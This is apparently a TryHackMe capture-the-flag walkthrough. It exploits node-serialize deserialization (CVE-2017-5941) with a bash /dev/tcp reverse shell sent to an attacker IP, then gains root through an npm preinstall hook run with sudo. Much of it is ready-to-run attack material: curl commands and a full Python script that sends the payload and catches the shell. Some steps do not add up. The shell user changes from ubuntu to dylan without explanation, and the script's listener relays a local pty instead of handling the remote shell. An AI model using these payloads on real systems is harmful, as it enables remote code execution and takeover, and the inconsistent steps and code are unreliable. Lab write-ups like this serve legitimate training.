# Full Writeup: TryHackMe "Jax Sucks Alot" (Jason)

## Step 1: Nmap Scan

```bash
nmap -sS -sV -p- <TARGET_IP>
```

**Result:** Only two ports open — **22 (SSH)** and **80 (HTTP)**. The web server is running **NodeJS**.

---

## Step 2: Web Enumeration

Open the site in a browser. You'll see a simple page saying **"Built with NodeJS"** with an email subscribe form.

Open **Burp Suite** (or DevTools) and intercept the request. You'll find a **`session`** cookie that is **Base64-encoded JSON**.

Decode it:

```bash
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==" | base64 -d
# Output: {"email":"test@test.com"}
```

This confirms the app uses **`node-serialize`** to deserialize the cookie → vulnerable to **CVE-2017-5941**.

---

## Step 3: Exploit — Node.js Deserialization RCE

### The Payload

The `node-serialize` library executes any key starting with `_$$ND_FUNC$$_` as a function (IIFE). We inject a reverse shell:

```json
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1');}()"
}
```

### Full Exploit Commands

**On your attack machine — start a listener:**

```bash
nc -lvnp 4444
```

**Build and send the malicious cookie:**

```bash
# 1. Build the payload JSON
PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require('"'"'child_process'"'"').exec('"'"'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"'"');}()"}'

# 2. Base64-encode it
ENCODED=$(echo -n "$PAYLOAD" | base64)

# 3. Send the request with the malicious cookie
curl -X GET "http://TARGET_IP/" \
  -H "Cookie: session=$ENCODED"
```

**You should get a reverse shell as the `ubuntu` user.**

### Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or for a better TTY:
export TERM=xterm-256color
stty raw -echo; fg
```

---

## Step 4: User Flag

```bash
ls /home/
# You'll see: dylan  ubuntu

cat /home/dylan/user.txt
```

```
user.txt
Answer format: THM{********************************}
Check
```

> **Submit the flag value from `user.txt` into the TryHackMe answer field.**

---

## Step 5: Privilege Escalation — npm (GTFOBins)

Check sudo permissions:

```bash
sudo -l
```

**Output:**
```
User dylan may run the following commands on <host>:
    (ALL) NOPASSWD: /usr/bin/npm
```

The user **`dylan`** can run **`npm`** as **root** without a password. This is a known GTFOBins privesc vector.

### GTFOBins npm Exploit

```bash
# Create a temp directory
TF=$(mktemp -d)

# Create a malicious package.json with a preinstall hook
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json

# Run npm install as root — the preinstall script spawns a shell
sudo npm -C $TF --unsafe-perm i
```

**You now have a root shell.**

---

## Step 6: Root Flag

```bash
cat /root/root.txt
```

```
root.txt
Answer format: THM{********************************}
Check
```

> **Submit the flag value from `root.txt` into the TryHackMe answer field.**

---

## Full Python Automation Script

This script automates the entire initial-access phase (deserialization exploit + reverse shell):

```python
#!/usr/bin/env python3
"""
TryHackMe - Jax Sucks Alot (Jason)
CVE-2017-5941 - Node.js node-serialize RCE
"""

import requests
import base64
import sys
import socket
import threading

# ============ CONFIG ============
TARGET_IP = "10.10.10.10"      # <-- Change to your target IP
ATTACKER_IP = "10.10.14.5"     # <-- Change to your attacker IP
LISTEN_PORT = 4444
# ================================


def build_payload():
    """Build the Node.js deserialization RCE payload."""
    reverse_shell = (
        f"bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1"
    )
    payload = {
        "rce": f"_$$ND_FUNC$$_function(){{require('child_process').exec('{reverse_shell}');}}()"
    }
    return payload


def encode_cookie(payload):
    """Base64-encode the payload JSON for the session cookie."""
    import json
    json_str = json.dumps(payload)
    return base64.b64encode(json_str.encode()).decode()


def start_listener():
    """Start a TCP listener and handle the reverse shell."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", LISTEN_PORT))
    s.listen(1)
    print(f"[*] Listening on 0.0.0.0:{LISTEN_PORT} ...")

    conn, addr = s.accept()
    print(f"[+] Reverse shell connected from {addr}")

    # Use pty for a better shell
    import pty
    os = __import__("os")
    master, slave = pty.openpty()
    os.write(master, b"sh -i\n")

    def send_data():
        try:
            while True:
                data = os.read(master, 1024)
                if not data:
                    break
                conn.sendall(data)
        except Exception:
            pass

    def recv_data():
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                os.write(master, data)
        except Exception:
            pass

    t1 = threading.Thread(target=send_data)
    t2 = threading.Thread(target=recv_data)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    conn.close()
    s.close()


def exploit():
    """Send the malicious cookie to the target."""
    target_url = f"http://{TARGET_IP}/"
    payload = build_payload()
    cookie_value = encode_cookie(payload)

    print(f"[*] Target: {target_url}")
    print(f"[*] Payload (decoded): {payload}")
    print(f"[*] Cookie (base64):   {cookie_value}")
    print(f"[*] Sending exploit request...")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Cookie": f"session={cookie_value}"
    }

    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response length: {len(response.text)} bytes")
        print("[+] Exploit sent. Waiting for reverse shell...")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)


def main():
    print("=" * 50)
    print("  Jax Sucks Alot - CVE-2017-5941 Exploit")
    print("=" * 50)

    # Start listener in a background thread
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    # Small delay to ensure listener is ready
    import time
    time.sleep(1)

    # Send the exploit
    exploit()

    # Keep the script alive (listener runs in background thread)
    print("[*] Script running. Shell will be handled in listener thread.")
    listener_thread.join()


if __name__ == "__main__":
    main()
```

### Usage

```bash
# 1. Edit the TARGET_IP and ATTACKER_IP at the top of the script
# 2. Run it:
python3 exploit.py
```

The script will:
1. Build the deserialization payload with your reverse shell
2. Base64-encode it into the `session` cookie
3. Send the HTTP GET request to the target
4. Accept the reverse shell and spawn an interactive PTY

---

## Summary Table

| Phase | Technique | Key Command |
|-------|-----------|-------------|
| Recon | Port scan | `nmap -sS -sV -p- <IP>` |
| Enum | Cookie analysis | `echo "<cookie>" \| base64 -d` |
| Exploit | CVE-2017-5941 RCE | `curl -H "Cookie: session=<payload>"` |
| User Flag | File read | `cat /home/dylan/user.txt` |
| Privesc | GTFOBins npm | `sudo npm -C $TF --unsafe-perm i` |
| Root Flag | File read | `cat /root/root.txt` |

---

## Reference Links

- [CVE-2017-5941 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
- [GTFOBins - npm](https://gtfobins.github.io/gtfobins/npm/)
- [Exploit-DB: Node.js RCE (OpSecX)](https://www.exploit-db.com/exploits/45265)
- [Exploit-DB: Node.js RCE (UndeadLarva)](https://www.exploit-db.com/exploits/49552)
- [PayloadsAllTheThings - Node Deserialization](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Node/)


